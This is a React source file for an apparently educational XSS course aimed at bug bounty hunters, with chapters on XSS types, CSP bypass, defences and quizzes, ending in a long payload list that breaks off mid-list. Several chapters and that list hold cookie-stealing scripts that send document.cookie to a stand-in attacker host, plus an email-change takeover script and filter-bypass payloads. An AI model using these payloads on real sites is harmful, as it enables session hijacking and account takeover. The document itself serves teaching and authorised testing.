import React, { useState } from "react";
import { Link } from "react-router-dom";
import Navbar from "../../../components/Navbar/Navbar";
import "./XSS.css";

const chapters = [
  // ====================== What is XSS? ======================
  {
    id: "what-is-xss",
    title: "What is XSS?",
    content: (
      <>
        <h2>What is Cross-Site Scripting (XSS)?</h2>

        <p>
          Cross-Site Scripting (XSS) is one of the most common and dangerous web
          application vulnerabilities. It allows an attacker to inject malicious
          client-side scripts (mostly JavaScript) into web pages that are later
          viewed by other users.
        </p>

        <p>
          When the victim’s browser loads the infected page, the malicious script
          runs with the same privileges as the legitimate website. This means the
          attacker can do almost anything the user can do on that website.
        </p>

        <div className="content-image">
          <img
            src="https://portswigger.net/cms/images/63/12/6c2f-article-understanding-xss.jpg"
            alt="How XSS Works"
            onError={(e) => {
              e.target.src =
                "https://via.placeholder.com/900x400/1a0b2e/a855f7?text=How+XSS+Works";
            }}
          />
          <p className="image-caption">Basic flow of a Cross-Site Scripting attack</p>
        </div>

        <h3>1. XSS vs SQL Injection – Clear Difference</h3>
        <p>
          Many beginners confuse XSS with SQL Injection. Here’s the simple difference:
        </p>
        <ul>
          <li>
            <strong>SQL Injection</strong> → Attacks the <strong>database</strong> on the server.
            The attacker tries to run SQL queries.
          </li>
          <li>
            <strong>XSS</strong> → Attacks the <strong>user’s browser</strong>.
            The attacker tries to run JavaScript in the victim’s browser.
          </li>
        </ul>
        <p>
          SQL Injection steals data from the database.  
          XSS steals data from the user’s browser session (cookies, tokens, actions).
        </p>

        <h3>2. How XSS Works (Step-by-Step)</h3>
        <p>Let’s understand the complete flow in simple language:</p>
        <ol>
          <li>
            <strong>Find a vulnerable input</strong> –  
            The attacker looks for any place where user input is taken
            (search bar, comment box, profile name, URL parameter, etc.)
            and then displayed back on the page without proper encoding.
          </li>
          <li>
            <strong>Inject the payload</strong> –  
            The attacker inserts a malicious JavaScript payload instead of normal text.
          </li>
          <li>
            <strong>Application reflects or stores the payload</strong> –  
            The website includes the attacker’s script in the HTML response.
          </li>
          <li>
            <strong>Victim opens the page</strong> –  
            When any user (or admin) opens that page, the browser thinks the script
            is part of the original website and executes it.
          </li>
          <li>
            <strong>Attacker gains control</strong> –  
            Now the malicious script can steal cookies, log keystrokes,
            change page content, or perform actions as the victim.
          </li>
        </ol>

        <h3>3. Why XSS is Extremely Dangerous</h3>
        <p>
          Because the script runs in the context of the target website, the attacker can:
        </p>
        <ul>
          <li>
            <strong>Steal Session Cookies</strong> –  
            If cookies are not protected with HttpOnly flag, the attacker can
            hijack the user’s account.
          </li>
          <li>
            <strong>Account Takeover</strong> –  
            Change email, password, or perform sensitive actions.
          </li>
          <li>
            <strong>Keylogging</strong> –  
            Capture everything the user types (passwords, messages, etc.).
          </li>
          <li>
            <strong>Phishing inside the real website</strong> –  
            Show a fake login form that looks 100% real.
          </li>
          <li>
            <strong>Force actions</strong> –  
            Make the victim transfer money, change settings, or delete data
            without their knowledge.
          </li>
          <li>
            <strong>Website Defacement</strong> –  
            Change the content of the page for all users.
          </li>
          <li>
            <strong>XSS Worms</strong> –  
            Create self-replicating scripts that spread automatically
            (famous example: Samy worm on MySpace).
          </li>
        </ul>

        <div className="content-image">
          <img
            src="https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/xss-cross-site-scripting.jpg"
            alt="XSS Impact"
            onError={(e) => {
              e.target.src =
                "https://via.placeholder.com/900x400/1a0b2e/a855f7?text=XSS+Impact";
            }}
          />
          <p className="image-caption">Possible impact of a successful XSS attack</p>
        </div>

        <h3>4. Real-World Impact in Bug Bounty</h3>
        <p>
          XSS is still one of the most rewarded vulnerabilities in bug bounty programs
          (HackerOne, Bugcrowd, Intigriti, etc.).
        </p>
        <ul>
          <li>Simple Reflected XSS can still pay good money if impact is clear.</li>
          <li>Stored XSS and DOM-Based XSS usually get higher severity.</li>
          <li>
            Companies care more about <strong>impact</strong> than just seeing an alert box.
          </li>
          <li>
            Account Takeover using XSS is one of the highest impact reports.
          </li>
        </ul>

        <h3>5. Important Mindset for Hunters</h3>
        <p>
          Many beginners stop at <code>alert(1)</code>.  
          Professional bug bounty hunters never stop there.
        </p>
        <p>
          Always ask yourself:
        </p>
        <ul>
          <li>Can I steal the session cookie?</li>
          <li>Can I perform sensitive actions?</li>
          <li>Can I target admin users?</li>
          <li>Can I chain this XSS with other vulnerabilities?</li>
        </ul>
        <p>
          The better the impact you demonstrate, the higher the bounty you receive.
        </p>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            XSS = Injecting JavaScript into a page that other users will load.  
            It attacks the browser (not the server directly) and can lead to
            full account compromise, data theft, and complete takeover of user sessions
            if exploited correctly.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the main difference between XSS and SQL Injection?",
      options: [
        "XSS attacks the database, SQL Injection attacks the browser",
        "XSS attacks the user’s browser, SQL Injection attacks the database",
        "Both attack the same layer",
        "XSS only works on mobile apps"
      ],
      correct: "XSS attacks the user’s browser, SQL Injection attacks the database",
    },
  },

  // ====================== Types of XSS ======================
  {
    id: "types",
    title: "Types of XSS",
    content: (
      <>
        <h2>Types of XSS</h2>

        <p>
          Cross-Site Scripting is mainly divided into three types.  
          Every bug bounty hunter must clearly understand the difference
          because the testing method, impact, and reporting style changes
          for each type.
        </p>

        <h3>1. Reflected XSS</h3>
        <p>
          Reflected XSS occurs when the application takes user input from
          the request (URL parameter, form field, header) and immediately
          reflects it in the response without proper encoding.
        </p>
        <p>
          The payload is not stored on the server. It only executes if the
          victim clicks a specially crafted link.
        </p>

        <p><strong>Common locations:</strong></p>
        <ul>
          <li>Search bars</li>
          <li>Error messages</li>
          <li>URL parameters</li>
          <li>Contact / feedback forms</li>
        </ul>

        <p><strong>Example Payload:</strong></p>
        <pre className="payload-box">
{`https://target.com/search?q=<script>alert(document.domain)</script>`}
        </pre>

        <p><strong>Impact:</strong> Usually requires social engineering (victim must click the link).</p>

        <h3>2. Stored XSS (Persistent XSS)</h3>
        <p>
          Stored XSS is more dangerous. The malicious payload is permanently
          saved on the server (database, file, comment system, user profile)
          and executes every time any user views the infected page.
        </p>

        <p><strong>Common locations:</strong></p>
        <ul>
          <li>Comment sections</li>
          <li>User profile fields (name, bio)</li>
          <li>Support tickets / chat messages</li>
          <li>Product reviews</li>
        </ul>

        <p><strong>Example Payload:</strong></p>
        <pre className="payload-box">
{`<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`}
        </pre>

        <p><strong>Impact:</strong> High – affects multiple users automatically. Often rewarded higher in bug bounty programs.</p>

        <h3>3. DOM-Based XSS</h3>
        <p>
          DOM-Based XSS happens entirely on the client side.  
          The server response does not contain the payload. Instead,
          insecure JavaScript takes data from the URL or other sources
          and writes it into the DOM unsafely.
        </p>

        <p><strong>Common dangerous sinks:</strong></p>
        <ul>
          <li><code>innerHTML</code></li>
          <li><code>document.write()</code></li>
          <li><code>eval()</code></li>
          <li>jQuery <code>.html()</code> / <code>.append()</code></li>
        </ul>

        <p><strong>Example Payload:</strong></p>
        <pre className="payload-box">
{`https://target.com/page#<img src=x onerror=alert(1)>`}
        </pre>

        <p>
          In this case the part after <code>#</code> is never sent to the server,
          but client-side JavaScript reads it and creates the vulnerability.
        </p>

        <div className="info-box">
          <h4>Quick Summary</h4>
          <ul>
            <li><strong>Reflected</strong> → Comes from request, needs victim to click link</li>
            <li><strong>Stored</strong> → Saved on server, affects many users</li>
            <li><strong>DOM-Based</strong> → Happens only in browser JavaScript</li>
          </ul>
        </div>
      </>
    ),
    quiz: {
      question: "Which type of XSS is permanently saved on the server and affects multiple users?",
      options: [
        "Reflected XSS",
        "Stored XSS",
        "DOM-Based XSS",
        "Self-XSS only"
      ],
      correct: "Stored XSS",
    },
  },

  // ====================== Reflected XSS ======================
  {
    id: "reflected",
    title: "Reflected XSS",
    content: (
      <>
        <h2>Reflected XSS</h2>

        <p>
          Reflected Cross-Site Scripting (Reflected XSS) is the most common
          type of XSS found in bug bounty programs. It occurs when an
          application takes user-supplied data from a request and immediately
          includes it in the response without proper output encoding or sanitization.
        </p>

        <p>
          The malicious payload is not stored on the server. It only executes
          when a victim visits a specially crafted URL that contains the payload.
        </p>

        <h3>How Reflected XSS Works</h3>
        <ol>
          <li>Attacker crafts a malicious URL containing a JavaScript payload.</li>
          <li>Attacker sends the link to the victim (via email, chat, social media, etc.).</li>
          <li>Victim clicks the link and makes a request to the vulnerable application.</li>
          <li>The application reflects the payload in the HTML response.</li>
          <li>Victim’s browser executes the attacker’s JavaScript.</li>
        </ol>

        <h3>Common Injection Points</h3>
        <ul>
          <li>Search bars and search result pages</li>
          <li>Error messages (“User not found: &lt;payload&gt;”)</li>
          <li>URL parameters (GET parameters)</li>
          <li>Contact forms and feedback forms</li>
          <li>Login / registration error pages</li>
          <li>Custom headers that are reflected</li>
        </ul>

        <h3>Basic Example</h3>
        <p>
          Suppose a website has a search feature:
        </p>
        <pre className="payload-box">
{`https://target.com/search?q=hello`}
        </pre>
        <p>
          The response contains:
        </p>
        <pre className="payload-box">
{`<h1>You searched for: hello</h1>`}
        </pre>
        <p>
          If the application does not encode the input, an attacker can inject:
        </p>
        <pre className="payload-box">
{`https://target.com/search?q=<script>alert(document.domain)</script>`}
        </pre>
        <p>
          The browser will execute the script and show an alert with the domain name.
        </p>

        <h3>Useful Payloads for Testing</h3>
        <pre className="payload-box">
{`"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
javascript:alert(1)
"><body onload=alert(1)>`}
        </pre>

        <h3>Impact of Reflected XSS</h3>
        <p>
          Even though Reflected XSS requires the victim to click a link,
          the impact can still be very high:
        </p>
        <ul>
          <li>Session hijacking (stealing cookies)</li>
          <li>Account takeover</li>
          <li>Phishing attacks (fake login forms)</li>
          <li>Keylogging</li>
          <li>Forced actions on behalf of the user</li>
        </ul>

        <p>
          In bug bounty programs, hunters often demonstrate impact by
          stealing the session cookie or performing a sensitive action.
        </p>

        <h3>How to Find Reflected XSS</h3>
        <ul>
          <li>Enter a unique string (e.g. <code>xss64test</code>) in every parameter</li>
          <li>Check if the string appears in the response</li>
          <li>If it appears, try injecting HTML/JavaScript special characters</li>
          <li>Use tools like Burp Suite (Repeater + Intruder) and browser DevTools</li>
          <li>Test both GET and POST parameters</li>
        </ul>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Reflected XSS = User input is immediately reflected in the response
            without encoding. It requires social engineering, but can still lead
            to full account compromise. Always focus on proving real impact
            when reporting.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is required for a Reflected XSS attack to succeed against a victim?",
      options: [
        "The payload must be stored in the database",
        "The victim must click a specially crafted link",
        "The attacker must have admin access",
        "The server must be running outdated software only"
      ],
      correct: "The victim must click a specially crafted link",
    },
  },

  // ====================== DOM-Based XSS ======================
  {
    id: "dom",
    title: "DOM-Based XSS",
    content: (
      <>
        <h2>DOM-Based XSS</h2>

        <p>
          DOM-Based XSS is a type of Cross-Site Scripting where the vulnerability
          exists entirely in the client-side JavaScript. The server response
          does not contain the malicious payload. Instead, insecure JavaScript
          code takes data from an untrusted source and writes it into the DOM
          in an unsafe way.
        </p>

        <p>
          This makes DOM-Based XSS harder to detect with traditional server-side
          scanners because the payload never appears in the HTML source returned
          by the server.
        </p>

        <h3>How DOM-Based XSS Works</h3>
        <ol>
          <li>The page loads normal HTML and JavaScript from the server.</li>
          <li>JavaScript reads data from an untrusted source (URL fragment, query parameter, referrer, etc.).</li>
          <li>That data is passed into a dangerous function (sink) without proper sanitization.</li>
          <li>The browser executes the attacker’s code.</li>
        </ol>

        <h3>Sources and Sinks</h3>
        <p>
          In DOM XSS we talk about two important things:
        </p>
        <ul>
          <li>
            <strong>Source</strong> – Where the untrusted data comes from
            (e.g. <code>location.hash</code>, <code>location.search</code>,
            <code>document.referrer</code>, <code>postMessage</code>)
          </li>
          <li>
            <strong>Sink</strong> – The dangerous function that executes or
            writes the data into the DOM
          </li>
        </ul>

        <p><strong>Common Dangerous Sinks:</strong></p>
        <ul>
          <li><code>innerHTML</code></li>
          <li><code>document.write()</code></li>
          <li><code>eval()</code></li>
          <li><code>setTimeout("...")</code> / <code>setInterval("...")</code></li>
          <li>jQuery <code>.html()</code>, <code>.append()</code>, <code>.after()</code></li>
          <li><code>location</code> / <code>location.href</code></li>
        </ul>

        <h3>Classic Example</h3>
        <p>
          Suppose the page contains this JavaScript:
        </p>
        <pre className="payload-box">
{`// Vulnerable code
const name = location.hash.substring(1);
document.getElementById("output").innerHTML = "Hello " + name;`}
        </pre>
        <p>
          An attacker can send this link:
        </p>
        <pre className="payload-box">
{`https://target.com/page#<img src=x onerror=alert(document.domain)>`}
        </pre>
        <p>
          The part after <code>#</code> is never sent to the server, but the
          JavaScript reads it and writes it into the DOM using <code>innerHTML</code>,
          causing XSS.
        </p>

        <h3>Useful Payloads for Testing</h3>
        <pre className="payload-box">
{`#<img src=x onerror=alert(1)>
#<svg onload=alert(1)>
#"><script>alert(1)</script>
javascript:alert(1)
#<img src=x onerror=alert(document.cookie)>`}
        </pre>

        <h3>Why DOM-Based XSS is Special</h3>
        <ul>
          <li>Payload is not visible in the server response</li>
          <li>Traditional server-side scanners often miss it</li>
          <li>It requires understanding of client-side JavaScript</li>
          <li>Very common in modern single-page applications (SPAs)</li>
        </ul>

        <h3>How to Find DOM-Based XSS</h3>
        <ul>
          <li>Use browser DevTools → Sources / Debugger</li>
          <li>Search JavaScript files for dangerous sinks</li>
          <li>Use tools like DOM Invader (Burp Suite), DOM XSS scanners</li>
          <li>Test URL fragments (<code>#</code>) and query parameters</li>
          <li>Check how the application handles <code>postMessage</code></li>
        </ul>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            DOM-Based XSS occurs when client-side JavaScript takes untrusted data
            and passes it into a dangerous sink without sanitization.
            The payload never appears in the server HTML, which makes it harder
            to detect. Always review JavaScript code carefully when testing
            modern web applications.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Why is DOM-Based XSS harder to detect with traditional server-side scanners?",
      options: [
        "Because the payload is stored in the database",
        "Because the payload never appears in the server HTML response",
        "Because it only works on mobile devices",
        "Because it requires admin privileges"
      ],
      correct: "Because the payload never appears in the server HTML response",
    },
  },

  // ====================== Stored XSS ======================
  {
    id: "stored",
    title: "Stored XSS",
    content: (
      <>
        <h2>Stored XSS (Persistent XSS)</h2>

        <p>
          Stored XSS (also called Persistent XSS) is one of the most dangerous
          types of Cross-Site Scripting. In this vulnerability, the attacker’s
          malicious payload is permanently stored on the target server
          (usually in a database) and is later executed in the browser of
          every user who views the infected page.
        </p>

        <p>
          Unlike Reflected XSS, the victim does not need to click any special
          link. Simply visiting the normal page is enough for the attack to execute.
        </p>

        <h3>How Stored XSS Works</h3>
        <ol>
          <li>Attacker submits a malicious payload through an input field (comment, profile, message, etc.).</li>
          <li>The application saves the payload in the database without proper sanitization.</li>
          <li>When any user (including admins) views the page that displays that data, the payload is loaded.</li>
          <li>The victim’s browser executes the attacker’s JavaScript automatically.</li>
        </ol>

        <h3>Common Injection Points</h3>
        <ul>
          <li>Comment sections and discussion forums</li>
          <li>User profile fields (name, bio, location, website)</li>
          <li>Support tickets / helpdesk messages</li>
          <li>Product reviews and ratings</li>
          <li>Chat applications and private messages</li>
          <li>File upload names (sometimes)</li>
          <li>Admin panels that display user-generated content</li>
        </ul>

        <h3>Basic Example</h3>
        <p>
          Suppose a blog allows users to post comments. An attacker posts:
        </p>
        <pre className="payload-box">
{`<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>`}
        </pre>
        <p>
          Every time someone (including the admin) opens that blog post,
          the script runs and sends the victim’s cookies to the attacker.
        </p>

        <h3>Useful Payloads for Testing</h3>
        <pre className="payload-box">
{`<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
{img src=x onerror=alert(1)}`}
        </pre>

        <h3>Impact of Stored XSS</h3>
        <p>
          Stored XSS is considered high or critical in most bug bounty programs
          because:
        </p>
        <ul>
          <li>It can affect many users automatically</li>
          <li>It can target administrators (privilege escalation)</li>
          <li>It can lead to mass account takeover</li>
          <li>It can be used to create XSS worms</li>
          <li>No social engineering is required after the payload is stored</li>
        </ul>

        <h3>How to Find Stored XSS</h3>
        <ul>
          <li>Test every input that is saved and later displayed</li>
          <li>Use a unique payload and check all pages where the data appears</li>
          <li>Test both visible fields and hidden/metadata fields</li>
          <li>Check admin panels if you have access</li>
          <li>Look for rich-text editors (they are often vulnerable)</li>
        </ul>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Stored XSS = Payload is saved on the server and executes for every
            user who views the page. It is more dangerous than Reflected XSS
            and usually receives higher rewards in bug bounty programs.
            Always demonstrate clear impact when reporting.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Why is Stored XSS generally considered more dangerous than Reflected XSS?",
      options: [
        "Because it only works once",
        "Because the payload is saved on the server and executes for every user who views the page",
        "Because it requires the victim to click a link every time",
        "Because it only affects the attacker"
      ],
      correct: "Because the payload is saved on the server and executes for every user who views the page",
    },
  },

  // ====================== CSP Bypass ======================
  {
    id: "csp",
    title: "CSP Bypass",
    content: (
      <>
        <h2>Content Security Policy (CSP) Bypass</h2>

        <p>
          Content Security Policy (CSP) is one of the strongest modern defenses
          against Cross-Site Scripting. It tells the browser which sources of
          content (scripts, styles, images, etc.) are allowed to load.
        </p>

        <p>
          When CSP is properly implemented, even if an attacker successfully
          injects a script tag, the browser will block its execution.
          However, many real-world CSP implementations contain misconfigurations
          that can still be bypassed.
        </p>

        <h3>What is Content Security Policy?</h3>
        <p>
          CSP is an HTTP response header (or meta tag) that controls which
          resources the browser is allowed to load. Example:
        </p>
        <pre className="payload-box">
{`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com`}
        </pre>
        <p>
          In the above policy, scripts can only be loaded from the same origin
          or from <code>https://trusted.cdn.com</code>.
        </p>

        <h3>Common Weak CSP Configurations</h3>
        <ul>
          <li><code>'unsafe-inline'</code> – Allows inline scripts (very dangerous)</li>
          <li><code>'unsafe-eval'</code> – Allows eval() and similar functions</li>
          <li>Wildcard domains (<code>*.example.com</code>)</li>
          <li>Allowing data: or blob: URIs</li>
          <li>Missing base-uri directive</li>
          <li>Overly permissive script-src</li>
        </ul>

        <h3>Popular CSP Bypass Techniques</h3>

        <p><strong>1. JSONP Endpoints</strong></p>
        <p>
          Some websites have JSONP endpoints that reflect user input inside
          a callback function. If the domain is allowed in script-src,
          it can be used to execute code.
        </p>
        <pre className="payload-box">
{`https://target.com/jsonp?callback=alert`}
        </pre>

        <p><strong>2. CDNs with Old Libraries</strong></p>
        <p>
          If a trusted CDN hosts old versions of Angular, jQuery, or other
          libraries that contain known XSS gadgets, they can be abused.
        </p>

        <p><strong>3. 'unsafe-inline' Present</strong></p>
        <p>
          If the policy contains <code>'unsafe-inline'</code>, normal
          inline script payloads will still work.
        </p>

        <p><strong>4. base-uri Attacks</strong></p>
        <p>
          If <code>base-uri</code> is not set, an attacker can inject a
          <code>&lt;base&gt;</code> tag and hijack relative script loads.
        </p>

        <p><strong>5. DOM Clobbering + CSP</strong></p>
        <p>
          In some cases, DOM clobbering can be combined with weak CSP
          to achieve code execution.
        </p>

        <h3>How to Test for CSP Bypass</h3>
        <ul>
          <li>Check the Content-Security-Policy header in response</li>
          <li>Look for 'unsafe-inline', 'unsafe-eval', wildcards</li>
          <li>Search for JSONP endpoints on allowed domains</li>
          <li>Check if trusted CDNs host vulnerable libraries</li>
          <li>Test base tag injection</li>
        </ul>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            CSP is a powerful defense, but it is only as strong as its
            configuration. Many websites still use weak policies that allow
            bypasses through JSONP, old CDN libraries, unsafe-inline,
            or missing directives. Always inspect the CSP header carefully
            when testing for XSS.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which CSP directive value is considered very dangerous because it allows inline scripts?",
      options: [
        "'self'",
        "'unsafe-inline'",
        "'none'",
        "https://trusted.cdn.com"
      ],
      correct: "'unsafe-inline'",
    },
  },

  // ====================== Real Bug Bounty Examples ======================
  {
    id: "examples",
    title: "Real Bug Bounty Examples",
    content: (
      <>
        <h2>Real Bug Bounty Examples</h2>

        <p>
          In real bug bounty programs, simply showing an <code>alert(1)</code>
          is usually not enough. Companies want to see <strong>clear impact</strong>.
          Professional hunters always try to chain XSS with other issues or
          demonstrate meaningful damage.
        </p>

        <p>
          Below are common high-impact scenarios that are frequently accepted
          and rewarded in bug bounty programs.
        </p>

        <h3>1. Session Hijacking (Cookie Theft)</h3>
        <p>
          The most classic high-impact XSS demonstration is stealing the
          session cookie.
        </p>
        <pre className="payload-box">
{`<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>`}
        </pre>
        <p>
          If the session cookie is not protected with the <code>HttpOnly</code>
          flag, the attacker can take over the victim’s account.
        </p>

        <h3>2. Account Takeover via Password Reset / Email Change</h3>
        <p>
          Many applications allow users to change their email or password
          without re-authentication. An attacker can use XSS to force
          these actions.
        </p>
        <pre className="payload-box">
{`<script>
  fetch('/api/user/email', {
    method: 'POST',
    body: 'email=attacker@evil.com',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'}
  })
</script>`}
        </pre>
        <p>
          This can lead to full account takeover.
        </p>

        <h3>3. XSS + CSRF Chain</h3>
        <p>
          Even if the application has CSRF protection, XSS can often bypass it
          because the malicious script runs in the victim’s browser and can
          read CSRF tokens.
        </p>

        <h3>4. Stored XSS in Admin Panel</h3>
        <p>
          One of the highest impact findings is Stored XSS that executes
          in an administrator’s browser. This can lead to:
        </p>
        <ul>
          <li>Admin account takeover</li>
          <li>Creation of new admin users</li>
          <li>Data exfiltration</li>
          <li>Full application compromise</li>
        </ul>

        <h3>5. XSS to Internal SSRF / Network Access</h3>
        <p>
          In some modern applications (especially with cloud metadata or
          internal tools), XSS can be used as a stepping stone to attack
          internal services.
        </p>

        <h3>How to Report for Maximum Impact</h3>
        <ul>
          <li>Never stop at alert(1)</li>
          <li>Show a clear attack scenario</li>
          <li>Demonstrate account takeover if possible</li>
          <li>Include screenshots or video PoC</li>
          <li>Explain business impact</li>
        </ul>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            In real bug bounty programs, impact matters more than the
            vulnerability type. Always try to escalate XSS into account
            takeover, admin access, or sensitive data theft. Clear and
            professional reports with strong impact get higher rewards.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What do bug bounty programs value most when you report an XSS?",
      options: [
        "Just showing alert(1)",
        "Clear impact such as account takeover or cookie theft",
        "The length of the payload",
        "Using only SVG payloads"
      ],
      correct: "Clear impact such as account takeover or cookie theft",
    },
  },

  // ====================== Prevention Tips ======================
  {
    id: "prevention",
    title: "Prevention Tips",
    content: (
      <>
        <h2>Prevention Tips (How to Stop XSS)</h2>

        <p>
          Preventing Cross-Site Scripting is mainly about treating all user
          input as untrusted and ensuring that data is safely handled when
          it is displayed in the browser.
        </p>

        <p>
          Below are the most effective and practical techniques used by
          secure applications.
        </p>

        <h3>1. Context-Aware Output Encoding</h3>
        <p>
          The most important defense is to encode data based on the context
          where it is being used.
        </p>
        <ul>
          <li><strong>HTML Context</strong> → Convert <code>&lt; &gt; &amp; " '</code> into HTML entities</li>
          <li><strong>JavaScript Context</strong> → Use JavaScript encoding</li>
          <li><strong>URL Context</strong> → Use URL encoding</li>
          <li><strong>CSS Context</strong> → Use CSS encoding</li>
        </ul>
        <p>
          Never use the same encoding for every situation. Wrong encoding
          can still leave the application vulnerable.
        </p>

        <h3>2. Use Modern Frameworks</h3>
        <p>
          Modern frontend frameworks (React, Vue, Angular) automatically
          escape data by default when you use their standard templating.
        </p>
        <p>
          Danger comes when developers bypass the framework protection
          using methods like:
        </p>
        <ul>
          <li><code>dangerouslySetInnerHTML</code> (React)</li>
          <li><code>v-html</code> (Vue)</li>
          <li><code>[innerHTML]</code> (Angular)</li>
        </ul>

        <h3>3. Implement Strong Content Security Policy (CSP)</h3>
        <p>
          A well-configured CSP can significantly reduce the impact of XSS
          even if a vulnerability exists.
        </p>
        <pre className="payload-box">
{`Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';`}
        </pre>
        <p>
          Avoid using <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code>
          whenever possible.
        </p>

        <h3>4. Validate and Sanitize Input</h3>
        <p>
          Input validation should be used as a secondary defense, not the
          primary one. Still, it helps reduce the attack surface.
        </p>
        <ul>
          <li>Whitelist allowed characters when possible</li>
          <li>Reject unexpected HTML tags</li>
          <li>Use trusted sanitization libraries (DOMPurify, etc.)</li>
        </ul>

        <h3>5. Secure Cookie Settings</h3>
        <p>
          Even if XSS occurs, you can reduce the damage by protecting cookies:
        </p>
        <ul>
          <li><code>HttpOnly</code> → JavaScript cannot read the cookie</li>
          <li><code>Secure</code> → Cookie is only sent over HTTPS</li>
          <li><code>SameSite</code> → Helps against CSRF</li>
        </ul>

        <h3>6. Additional Best Practices</h3>
        <ul>
          <li>Set the <code>X-Content-Type-Options: nosniff</code> header</li>
          <li>Use the <code>X-Frame-Options</code> or CSP frame-ancestors</li>
          <li>Keep all libraries and dependencies updated</li>
          <li>Perform regular security code reviews</li>
          <li>Use automated scanners + manual testing</li>
        </ul>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            The best way to prevent XSS is a combination of:
            <strong> context-aware output encoding</strong> +
            <strong> strong CSP</strong> +
            <strong> secure frameworks</strong> +
            <strong> HttpOnly cookies</strong>.
            Never rely on only one defense layer.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the most important defense against XSS?",
      options: [
        "Only using blacklists",
        "Context-aware output encoding",
        "Disabling JavaScript completely",
        "Using only GET requests"
      ],
      correct: "Context-aware output encoding",
    },
  },

  // ====================== XSS Payloads ======================
  {
    id: "payloads",
    title: "XSS Payloads (80+)",
    content: (
      <>
        <h2>XSS Payloads Collection (80+)</h2>

        <p>
          Below is a practical collection of XSS payloads used by bug bounty hunters
          and penetration testers. These payloads help in testing different contexts
          and bypassing simple filters.
        </p>

        <p>
          <strong>Note:</strong> Always use these payloads only on applications you
          have permission to test.
        </p>

        <h3>1. Basic Alert Payloads</h3>
        <pre className="payload-box">
{`<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>alert(String.fromCharCode(88,83,83))</script>`}
        </pre>

        <h3>2. Image / onerror Payloads</h3>
        <pre className="payload-box">
{`<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<img src=x onerror=alert(document.cookie)>
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=1 onerror=alert(1)>
<img src=x onerror=alert(1) />
<img/src=x onerror=alert(1)>`}
        </pre>

        <h3>3. SVG Based Payloads</h3>
        <pre className="payload-box">
{`<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload=alert(document.domain)>
<svg onload=alert(document.cookie)>
<svg><script>alert(1)</script></svg>
<svg><animatetransform onbegin=alert(1)>
<svg><set onbegin=alert(1)>`}
        </pre>

        <h3>4. Body & Event Handler Payloads</h3>
        <pre className="payload-box">
{`<body onload=alert(1)>
<body onclick=alert(1)>
<body onfocus=alert(1)>
<body onpageshow=alert(1)>
<body onhashchange=alert(1)>
<body onbeforeunload=alert(1)>
<body oninput=alert(1)>`}
        </pre>

        <h3>5. Input & Form Payloads</h3>
        <pre className="payload-box">
{`<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>
<input oninput=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<form><button formaction=javascript:alert(1)>CLICK`}
        </pre>

        <h3>6. Filter Bypass Payloads</h3>
        <pre className="payload-box">
{`<scr<script>ipt>alert(1)</script>
<sCrIpT>alert(1)</sCrIpT>
<script>al\u0065rt(1)</script>
<script>al&#x65;rt(1)</script>
<script>alert\`1\`</script>
<script>(alert)(1)</script>
<script>window['alert'](1)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](1)</script>`}
        </pre>

        <h3>7. Without Parentheses</h3>
        <pre className="payload-box">
{`<script>alert\`1\`</script>
<script>alert\`document.domain\`</script>
<script>onerror=alert;throw 1</script>
<script>{}['alert'](1)</script>
<img src=x onerror=alert\`1\`>`}
        </pre>

        <h3>8. Without alert()</h3>
        <pre className="payload-box">
{`<script>confirm(1)</script>
<script>prompt(1)</script>
<script>eval('ale'+'rt(1)')</script>
<script>Function('ale'+'rt(1)')()</script>
<script>[].constructor.constructor('alert(1)')()</script>
<script>top['al'+'ert'](1)</script>`}
        </pre>

        <h3>9. DOM / Location Based</h3>
        <pre className="payload-box">
{`"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
javascript:alert(1)
javascript:alert(document.domain)
"><body onload=alert(1)>
'"><img src=x onerror=alert(1)>`}
        </pre>

        <h3>10. Advanced & WAF Bypass Style</h3>
        <pre className="payload-box">
{`<img src=x oneonerrorrror=alert(1)>
<img src=x oNeRrOr=alert(1)>
<svg><script>alert&#40;1)</script>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<link rel="import" href="data:text/html,<script>alert(1)</script>">
<math><mi//xlink:href="data:x,<script>alert(1)</script>">`}
        </pre>

        <h3>11. Cookie Stealer Payloads</h3>
        <pre className="payload-box">
{`<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
